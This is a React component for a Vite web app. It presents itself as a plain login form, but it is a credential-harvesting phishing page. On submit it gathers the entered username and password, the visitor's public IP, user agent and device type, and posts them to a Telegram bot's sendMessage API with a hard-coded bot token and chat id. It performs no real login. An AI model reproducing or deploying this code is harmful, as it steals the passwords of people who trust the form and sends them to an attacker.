import { useState } from 'react'
import reactLogo from './assets/react.svg'
import viteLogo from '/vite.svg'
import './App.css'

function App() {
  const [count, setCount] = useState(0)
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  async function handleSubmit(e) {
    e.preventDefault();
    setLoading(true);

    // Get user agent
    const userAgent = navigator.userAgent;

    // Get IP address
    let ip = '';
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      ip = data.ip;
    } catch {
      ip = 'Unknown';
    }

    // Get device type using Google API (User-Agent Client Hints)
    let deviceType = 'Unknown';
    if (navigator.userAgentData) {
      deviceType = navigator.userAgentData.mobile ? 'Mobile' : 'Desktop';
    } else {
      deviceType = /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'Desktop';
    }

    // MAC address is not accessible from browser JS for security reasons
    const macAddress = 'Not available in browser';

    const creds = {
      timestamp: new Date().toLocaleString(),
      ip,
      user_agent: userAgent,
      username,
      password,
      device_type: deviceType,
      mac_address: macAddress,
    };

    const message =
      `📩 New Submission:\n` +
      `🕒 Timestamp: ${creds.timestamp}\n` +
      `🌐 IP: ${creds.ip}\n` +
      `🖥️ User-Agent: ${creds.user_agent}\n` +
      `📱 Device: ${creds.device_type}\n` +
      `🕹️ MAC: ${creds.mac_address}\n` +
      `👤 Username: ${creds.username}\n` +
      `🔑 Password: ${creds.password}`;

    await fetch(`https://api.telegram.org/bot7502132221:AAEreYpsCAFob_Yo5owYp4VAJz8okueT5Xg/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: '-4886327064',
        text: message,
      }),
    });

    setLoading(false);
    setUsername('');
    setPassword('');
  }

  return (
    <div className="login-container">
      <h2>Login</h2>
      <form onSubmit={handleSubmit}>
        <div>
          <label>
            Username:
            <input
              type="text"
              value={username}
              onChange={e => setUsername(e.target.value)}
              required
              disabled={loading}
            />
          </label>
        </div>
        <div>
          <label>
            Password:
            <input
              type="password"
              value={password}
              onChange={e => setPassword(e.target.value)}
              required
              disabled={loading}
            />
          </label>
        </div>
        <button type="submit" disabled={loading}>
          {loading ? 'Submitting...' : 'Login'}
        </button>
      </form>
    </div>
  )
}

export default App
